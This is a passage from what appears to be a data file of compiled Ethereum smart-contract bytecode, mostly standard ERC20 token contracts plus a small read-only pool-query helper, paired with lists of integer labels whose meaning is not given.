5045524d49545f4f574e45525f5a45524f5f414444524553534552525f42454c4f575f434f4c4c41544552414c495a4154494f4e5f524154494f4552525f45524332305f4d494e545f544f54414c5f535550504c595f4f564552464c4f574552525f45524332305f5045524d49545f5245434f56455245445f4f574e45525f5a45524f5f414444524553534552525f45524332305f44454352454153455f414c4c4f57414e43455f554e444552464c4f574552525f5245434f5645525f4e4f4e5f5245434f56455241424c455f544f4b454e4552525f45524332305f415050524f56455f544f5f5a45524f5f414444524553534552525f45524332305f5452414e534645525f46524f4d5f5a45524f5f414444524553534552525f45524332305f5452414e534645525f46524f4d5f494e53554646494349454e545f414c4c4f57414e43454552525f4c49515549444154455f424f52524f575f43414c4c5f434c555443485f434f4c4c41544552414c4552525f45524332305f4255524e5f544f54414c5f535550504c595f554e444552464c4f574552525f45524332305f494e4352454153455f414c4c4f57414e43455f4f564552464c4f574552525f52455041595f424f52524f575f494e53554646494349454e545f42414c414e43454552525f52455041595f424f52524f575f494e53554646494349454e545f444542544552525f45524332305f5045524d49545f5350454e4445525f5a45524f5f414444524553534552525f52455041595f424f52524f575f43414c4c5f5345545f5641554c545f444542544552525f534146455f45524332305f43414c4c5f544f5f4e4f4e5f434f4e54524143544552525f45524332305f5045524d49545f494e56414c49445f5349474e41545552454552525f45524332305f5452414e534645525f544f5f5a45524f5f414444524553534552525f424f52524f575f4c4f434b45445f434f4c4c41544552414c5f5a45524f4552525f45524332305f5452414e534645525f53454e4445525f42414c414e43455f554e444552464c4f574552525f45524332305f415050524f56455f46524f4d5f5a45524f5f41444452455353a264697066735822122058972d031ceb296730968d1195213dc7aa6ffe2ae0cfc04b1ae1348e0647923464736f6c63430007040033', '0x608060405234801561001057600080fd5b50600436106101005760003560e01c806370a0823111610097578063a457c2d711610066578063a457c2d7146102ee578063a9059cbb1461031a578063aa271e1a14610346578063dd62ed3e1461036c57610100565b806370a082311461029057806395d89b41146102b6578063983b2d56146102be57806398650275146102e657610100565b8063313ce567116100d3578063313ce56714610212578063355274ea14610230578063395093511461023857806340c10f191461026457610100565b806306fdde0314610105578063095ea7b31461018257806318160ddd146101c257806323b872dd146101dc575b600080fd5b61010d61039a565b6040805160208082528351818301528351919283929083019185019080838360005b8381101561014757818101518382015260200161012f565b50505050905090810190601f1680156101745780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6101ae6004803603604081101561019857600080fd5b506001600160a01b038135169060200135610430565b604080519115158252519081900360200190f35b6101ca61044d565b60408051918252519081900360200190f35b6101ae600480360360608110156101f257600080fd5b506001600160a01b03813581169160208101359091169060400135610453565b61021a6104e0565b6040805160ff9092168252519081900360200190f35b6101ca6104e9565b6101ae6004803603604081101561024e57600080fd5b506001600160a01b0381351690602001356104ef565b6101ae6004803603604081101561027a57600080fd5b506001600160a01b038135169060200135610543565b6101ca600480360360208110156102a657600080fd5b50356001600160a01b031661059a565b61010d6105b5565b6102e4600480360360208110156102d457600080fd5b50356001600160a01b0316610615565b005b6102e4610667565b6101ae6004803603604081101561030457600080fd5b506001600160a01b038135169060200135610679565b6101ae6004803603604081101561033057600080fd5b506001600160a01b0381351690602001356106e7565b6101ae6004803603602081101561035c57600080fd5b50356001600160a01b03166106fb565b6101ca6004803603604081101561038257600080fd5b506001600160a01b0381358116916020013516610714565b60008054604080516020601f60026000196101006001881615020190951694909404938401819004810282018101909252828152606093909290918301828280156104265780601f106103fb57610100808354040283529160200191610426565b820191906000526020600020905b81548152906001019060200180831161040957829003601f168201915b5050505050905090565b600061044461043d61073f565b8484610743565b50600192915050565b60055490565b600061046084848461082f565b6104d68461046c61073f565b6104d185604051806060016040528060288152602001610e8f602891396001600160a01b038a166000908152600460205260408120906104aa61073f565b6001600160a01b03168152602081019190915260400160002054919063ffffffff61098d16565b610743565b5060019392505050565b60025460ff1690565b60075490565b60006104446104fc61073f565b846104d1856004600061050d61073f565b6001600160a01b03908116825260208083019390935260409182016000908120918c16815292529020549063ffffffff610a2416565b600061055561055061073f565b6106fb565b6105905760405162461bcd60e51b8152600401808060200182810382526030815260200180610e3e6030913960400191505060405180910390fd5b6104448383610a85565b6001600160a01b031660009081526003602052604090205490565b60018054604080516020601f600260001961010087891615020190951694909404938401819004810282018101909252828152606093909290918301828280156104265780601f106103fb57610100808354040283529160200191610426565b61062061055061073f565b61065b5760405162461bcd60e51b8152600401808060200182810382526030815260200180610e3e6030913960400191505060405180910390fd5b61066481610b01565b50565b61067761067261073f565b610b49565b565b600061044461068661073f565b846104d185604051806060016040528060258152602001610f2260259139600460006106b061073f565b6001600160a01b03908116825260208083019390935260409182016000908120918d1681529252902054919063ffffffff61098d16565b60006104446106f461073f565b848461082f565b600061070e60068363ffffffff610b9116565b92915050565b6001600160a01b03918216600090815260046020908152604080832093909416825291909152205490565b3390565b6001600160a01b0383166107885760405162461bcd60e51b8152600401808060200182810382526024815260200180610efe6024913960400191505060405180910390fd5b6001600160a01b0382166107cd5760405162461bcd60e51b8152600401808060200182810382526022815260200180610df66022913960400191505060405180910390fd5b6001600160a01b03808416600081815260046020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b6001600160a01b0383166108745760405162461bcd60e51b8152600401808060200182810382526025815260200180610ed96025913960400191505060405180910390fd5b6001600160a01b0382166108b95760405162461bcd60e51b8152600401808060200182810382526023815260200180610dd36023913960400191505060405180910390fd5b6108fc81604051806060016040528060268152602001610e18602691396001600160a01b038616600090815260036020526040902054919063ffffffff61098d16565b6001600160a01b038085166000908152600360205260408082209390935590841681522054610931908263ffffffff610a2416565b6001600160a01b0380841660008181526003602090815260409182902094909455805185815290519193928716927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef92918290030190a3505050565b60008184841115610a1c5760405162461bcd60e51b81526004018080602001828103825283818151815260200191508051906020019080838360005b838110156109e15781810151838201526020016109c9565b50505050905090810190601f168015610a0e5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b505050900390565b600082820183811015610a7e576040805162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f770000000000604482015290519081900360640190fd5b9392505050565b600754610aa082610a9461044d565b9063ffffffff610a2416565b1115610af3576040805162461bcd60e51b815260206004820152601960248201527f45524332304361707065643a2063617020657863656564656400000000000000604482015290519081900360640190fd5b610afd8282610bf8565b5050565b610b1260068263ffffffff610cea16565b6040516001600160a01b038216907f6ae172837ea30b801fbfcdd4108aa1d5bf8ff775444fd70256b44e6bf3dfc3f690600090a250565b610b5a60068263ffffffff610d6b16565b6040516001600160a01b038216907fe94479a9f7e1952cc78f2d6baab678adc1b772d936c6583def489e524cb6669290600090a250565b60006001600160a01b038216610bd85760405162461bcd60e51b8152600401808060200182810382526022815260200180610eb76022913960400191505060405180910390fd5b506001600160a01b03166000908152602091909152604090205460ff1690565b6001600160a01b038216610c53576040805162461bcd60e51b815260206004820152601f60248201527f45524332303a206d696e7420746f20746865207a65726f206164647265737300604482015290519081900360640190fd5b600554610c66908263ffffffff610a2416565b6005556001600160a01b038216600090815260036020526040902054610c92908263ffffffff610a2416565b6001600160a01b03831660008181526003602090815260408083209490945583518581529351929391927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9281900390910190a35050565b610cf48282610b91565b15610d46576040805162461bcd60e51b815260206004820152601f60248201527f526f6c65733a206163636f756e7420616c72656164792068617320726f6c6500604482015290519081900360640190fd5b6001600160a01b0316600090815260209190915260409020805460ff19166001179055565b610d758282610b91565b610db05760405162461bcd60e51b8152600401808060200182810382526021815260200180610e6e6021913960400191505060405180910390fd5b6001600160a01b0316600090815260209190915260409020805460ff1916905556fe45524332303a207472616e7366657220746f20746865207a65726f206164647265737345524332303a20617070726f766520746f20746865207a65726f206164647265737345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63654d696e746572526f6c653a2063616c6c657220646f6573206e6f74206861766520746865204d696e74657220726f6c65526f6c65733a206163636f756e7420646f6573206e6f74206861766520726f6c6545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365526f6c65733a206163636f756e7420697320746865207a65726f206164647265737345524332303a207472616e736665722066726f6d20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f206164647265737345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a65726fa265627a7a72305820f80ab6aa2644f388569754795385a72725551b422d66a049549c8f8b8756ed1364736f6c634300050a0032', '0x608060405234801561001057600080fd5b50600436106100a95760003560e01c80633950935111610071578063395093511461025f57806370a08231146102c557806395d89b411461031d578063a457c2d7146103a0578063a9059cbb14610406578063dd62ed3e1461046c576100a9565b806306fdde03146100ae578063095ea7b31461013157806318160ddd1461019757806323b872dd146101b5578063313ce5671461023b575b600080fd5b6100b66104e4565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100f65780820151818401526020810190506100db565b50505050905090810190601f1680156101235780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b61017d6004803603604081101561014757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610586565b604051808215151515815260200191505060405180910390f35b61019f6105a4565b6040518082815260200191505060405180910390f35b610221600480360360608110156101cb57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506105ae565b604051808215151515815260200191505060405180910390f35b610243610687565b604051808260ff1660ff16815260200191505060405180910390f35b6102ab6004803603604081101561027557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061069e565b604051808215151515815260200191505060405180910390f35b610307600480360360208110156102db57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610751565b6040518082815260200191505060405180910390f35b610325610799565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561036557808201518184015260208101905061034a565b50505050905090810190601f1680156103925780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6103ec600480360360408110156103b657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061083b565b604051808215151515815260200191505060405180910390f35b6104526004803603604081101561041c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610908565b604051808215151515815260200191505060405180910390f35b6104ce6004803603604081101561048257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610926565b6040518082815260200191505060405180910390f35b606060038054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561057c5780601f106105515761010080835404028352916020019161057c565b820191906000526020600020905b81548152906001019060200180831161055f57829003601f168201915b5050505050905090565b600061059a6105936109ad565b84846109b5565b6001905092915050565b6000600254905090565b60006105bb848484610bac565b61067c846105c76109ad565b6106778560405180606001604052806028815260200161102660289139600160008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600061062d6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b600190509392505050565b6000600560009054906101000a900460ff16905090565b60006107476106ab6109ad565b8461074285600160006106bc6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6109b5565b6001905092915050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b606060048054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156108315780601f1061080657610100808354040283529160200191610831565b820191906000526020600020905b81548152906001019060200180831161081457829003601f168201915b5050505050905090565b60006108fe6108486109ad565b846108f98560405180606001604052806025815260200161109760259139600160006108726109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b6001905092915050565b600061091c6109156109ad565b8484610bac565b6001905092915050565b6000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610a3b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260248152602001806110736024913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610ac1576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526022815260200180610fde6022913960400191505060405180910390fd5b80600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040518082815260200191505060405180910390a3505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610c32576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602581526020018061104e6025913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610cb8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526023815260200180610fbb6023913960400191505060405180910390fd5b610cc3838383610fb5565b610d2e81604051806060016040528060268152602001611000602691396000808773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610dc1816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a3505050565b6000838311158290610f1a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b83811015610edf578082015181840152602081019050610ec4565b50505050905090810190601f168015610f0c5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385039050809150509392505050565b600080828401905083811015610fab576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b50505056fe45524332303a207472616e7366657220746f20746865207a65726f206164647265737345524332303a20617070726f766520746f20746865207a65726f206164647265737345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e636545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e636545524332303a207472616e736665722066726f6d20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f206164647265737345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a65726fa26469706673582212204897325f6a9671cb2f29f875b7efdbbd4fd9aa7af3305b13a6ef5e47d81eafa764736f6c63430006060033', '0x608060405234801561001057600080fd5b50600436106100415760003560e01c806330fa738c14610046578063d4fac45d14610064578063f72c079114610084575b600080fd5b61004e61008c565b60405161005b9190610573565b60405180910390f35b61007761007236600461049e565b6100c5565b60405161005b91906105e4565b61004e61040d565b6040518060400160405280600581526020017f455243323000000000000000000000000000000000000000000000000000000081525081565b60008073c2edad668740f1aa35e4d8f227fb8e17dca888cd73ffffffffffffffffffffffffffffffffffffffff1663081e3eda6040518163ffffffff1660e01b815260040160206040518083038186803b15801561012257600080fd5b505afa158015610136573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061015a919061055b565b905073ffffffffffffffffffffffffffffffffffffffff8416736b3595068778dd592e39a122f4f5a5cf09c90fe21415610252576000805b82811015610248576040517f195426ec00000000000000000000000000000000000000000000000000000000815273c2edad668740f1aa35e4d8f227fb8e17dca888cd9063195426ec906101ec90849089906004016105ed565b60206040518083038186803b15801561020457600080fd5b505afa158015610218573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061023c919061055b565b90910190600101610192565b5091506104079050565b60005b8181101561040057610265610446565b6040517f93f1a40b00000000000000000000000000000000000000000000000000000000815273c2edad668740f1aa35e4d8f227fb8e17dca888cd906393f1a40b906102b790859089906004016105ed565b604080518083038186803b1580156102ce57600080fd5b505afa1580156102e2573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103069190610528565b9050610310610460565b6040517f1526fe2700000000000000000000000000000000000000000000000000000000815273c2edad668740f1aa35e4d8f227fb8e17dca888cd90631526fe27906103609086906004016105e4565b60806040518083038186803b15801561037857600080fd5b505afa15801561038c573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103b091906104d6565b90508673ffffffffffffffffffffffffffffffffffffffff16816000015173ffffffffffffffffffffffffffffffffffffffff1614156103f65750519250610407915050565b5050600101610255565b5060009150505b92915050565b6040518060400160405280600581526020017f417373657400000000000000000000000000000000000000000000000000000081525081565b604051806040016040528060008152602001600081525090565b6040518060800160405280600073ffffffffffffffffffffffffffffffffffffffff1681526020016000815260200160008152602001600081525090565b600080604083850312156104b0578182fd5b82356104bb81610638565b915060208301356104cb81610638565b809150509250929050565b6000608082840312156104e7578081fd5b6104f16080610611565b82516104fc81610638565b808252506020830151602082015260408301516040820152606083015160608201528091505092915050565b600060408284031215610539578081fd5b6105436040610611565b82518152602083015160208201528091505092915050565b60006020828403121561056c578081fd5b5051919050565b6000602080835283518082850152825b8181101561059f57858101830151858201604001528201610583565b818111156105b05783604083870101525b50601f017fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe016929092016040019392505050565b90815260200190565b91825273ffffffffffffffffffffffffffffffffffffffff16602082015260400190565b60405181810167ffffffffffffffff8111828210171561063057600080fd5b604052919050565b73ffffffffffffffffffffffffffffffffffffffff8116811461065a57600080fd5b5056fea2646970667358221220a3c4279badf4199c7d286a57ca8c9a22da00bc005b3a693fba5674f626e7ad4b64736f6c63430006050033', '0x608060405234801561001057600080fd5b50600436106100a95760003560e01c80633950935111610071578063395093511461025857806370a08231146102bc57806395d89b4114610314578063a457c2d714610397578063a9059cbb146103fb578063dd62ed3e1461045f576100a9565b806306fdde03146100ae578063095ea7b31461013157806318160ddd1461019557806323b872dd146101b3578063313ce56714610237575b600080fd5b6100b66104d7565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100f65780820151818401526020810190506100db565b50505050905090810190601f1680156101235780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b61017d6004803603604081101561014757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610579565b60405180821515815260200191505060405180910390f35b61019d610597565b6040518082815260200191505060405180910390f35b61021f600480360360608110156101c957600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506105a1565b60405180821515815260200191505060405180910390f35b61023f61067a565b604051808260ff16815260200191505060405180910390f35b6102a46004803603604081101561026e57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610691565b60405180821515815260200191505060405180910390f35b6102fe600480360360208110156102d257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610744565b6040518082815260200191505060405180910390f35b61031c61078c565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561035c578082015181840152602081019050610341565b50505050905090810190601f1680156103895780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6103e3600480360360408110156103ad57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061082e565b60405180821515815260200191505060405180910390f35b6104476004803603604081101561041157600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506108fb565b60405180821515815260200191505060405180910390f35b6104c16004803603604081101561047557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610919565b6040518082815260200191505060405180910390f35b606060038054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561056f5780601f106105445761010080835404028352916020019161056f565b820191906000526020600020905b81548152906001019060200180831161055257829003601f168201915b5050505050905090565b600061058d6105866109a0565b84846109a8565b6001905092915050565b6000600254905090565b60006105ae848484610b9f565b61066f846105ba6109a0565b61066a8560405180606001604052806028815260200161101960289139600160008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006106206109a0565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e609092919063ffffffff16565b6109a8565b600190509392505050565b6000600560009054906101000a900460ff16905090565b600061073a61069e6109a0565b8461073585600160006106af6109a0565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2090919063ffffffff16565b6109a8565b6001905092915050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b606060048054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156108245780601f106107f957610100808354040283529160200191610824565b820191906000526020600020905b81548152906001019060200180831161080757829003601f168201915b5050505050905090565b60006108f161083b6109a0565b846108ec8560405180606001604052806025815260200161108a60259139600160006108656109a0565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e609092919063ffffffff16565b6109a8565b6001905092915050565b600061090f6109086109a0565b8484610b9f565b6001905092915050565b6000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610a2e576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260248152602001806110666024913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610ab4576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526022815260200180610fd16022913960400191505060405180910390fd5b80600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040518082815260200191505060405180910390a3505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610c25576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260258152602001806110416025913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610cab576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526023815260200180610fae6023913960400191505060405180910390fd5b610cb6838383610fa8565b610d2181604051806060016040528060268152602001610ff3602691396000808773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e609092919063ffffffff16565b6000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610db4816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2090919063ffffffff16565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a3505050565b6000838311158290610f0d576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b83811015610ed2578082015181840152602081019050610eb7565b50505050905090810190601f168015610eff5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385039050809150509392505050565b600080828401905083811015610f9e576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b50505056fe45524332303a207472616e7366657220746f20746865207a65726f206164647265737345524332303a20617070726f766520746f20746865207a65726f206164647265737345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e636545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e636545524332303a207472616e736665722066726f6d20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f206164647265737345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a65726fa26469706673582212205743796c94d211514f736707650997ad9b801a0b86e3e19f93add90a25774cc064736f6c634300060c0033', '0x608060405234801561001057600080fd5b50600436106100a95760003560e01c8063395093511161007157806339509351146101d957806370a082311461020557806395d89b411461022b578063a457c2d714610233578063a9059cbb1461025f578063dd62ed3e1461028b576100a9565b806306fdde03146100ae578063095ea7b31461012b57806318160ddd1461016b57806323b872dd14610185578063313ce567146101bb575b600080fd5b6100b66102b9565b6040805160208082528351818301528351919283929083019185019080838360005b838110156100f05781810151838201526020016100d8565b50505050905090810190601f16801561011d5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6101576004803603604081101561014157600080fd5b506001600160a01b038135169060200135610347565b604080519115158252519081900360200190f35b6101736103c3565b60408051918252519081900360200190f35b6101576004803603606081101561019b57600080fd5b506001600160a01b038135811691602081013590911690604001356103c9565b6101c3610492565b6040805160ff9092168252519081900360200190f35b610157600480360360408110156101ef57600080fd5b506001600160a01b03813516906020013561049b565b6101736004803603602081101561021b57600080fd5b50356001600160a01b0316610549565b6100b6610564565b6101576004803603604081101561024957600080fd5b506001600160a01b0381351690602001356105bf565b6101576004803603604081101561027557600080fd5b506001600160a01b038135169060200135610608565b610173600480360360408110156102a157600080fd5b506001600160a01b038135811691602001351661061e565b6004805460408051602060026001851615610100026000190190941693909304601f8101849004840282018401909252818152929183018282801561033f5780601f106103145761010080835404028352916020019161033f565b820191906000526020600020905b81548152906001019060200180831161032257829003601f168201915b505050505081565b60006001600160a01b03831661035c57600080fd5b3360008181526001602090815260408083206001600160a01b03881680855290835292819020869055805186815290519293927f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925929181900390910190a350600192915050565b60025490565b6001600160a01b03831660009081526001602090815260408083203384529091528120546103fd908363ffffffff61064916565b6001600160a01b038516600090815260016020908152604080832033845290915290205561042c84848461065e565b6001600160a01b0384166000818152600160209081526040808320338085529083529281902054815190815290519293927f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925929181900390910190a35060019392505050565b60055460ff1681565b60006001600160a01b0383166104b057600080fd5b3360009081526001602090815260408083206001600160a01b03871684529091529020546104e4908363ffffffff61072916565b3360008181526001602090815260408083206001600160a01b0389168085529083529281902085905580519485525191937f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925929081900390910190a350600192915050565b6001600160a01b031660009081526020819052604090205490565b6003805460408051602060026001851615610100026000190190941693909304601f8101849004840282018401909252818152929183018282801561033f5780601f106103145761010080835404028352916020019161033f565b60006001600160a01b0383166105d457600080fd5b3360009081526001602090815260408083206001600160a01b03871684529091529020546104e4908363ffffffff61064916565b600061061533848461065e565b50600192915050565b6001600160a01b03918216600090815260016020908152604080832093909416825291909152205490565b60008282111561065857600080fd5b50900390565b6001600160a01b03821661067157600080fd5b6001600160a01b03831660009081526020819052604090205461069a908263ffffffff61064916565b6001600160a01b0380851660009081526020819052604080822093909355908416815220546106cf908263ffffffff61072916565b6001600160a01b038084166000818152602081815260409182902094909455805185815290519193928716927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef92918290030190a3505050565b60008282018381101561073b57600080fd5b939250505056fea165627a7a72305820c834b7d6a764ae5979774562c36b4eaecf33c95dc4111d810976a9d9798683010029'], [[1], [2, 1, 3], [4], [4], [2, 5], [4], [4], [4], [4], [4]])
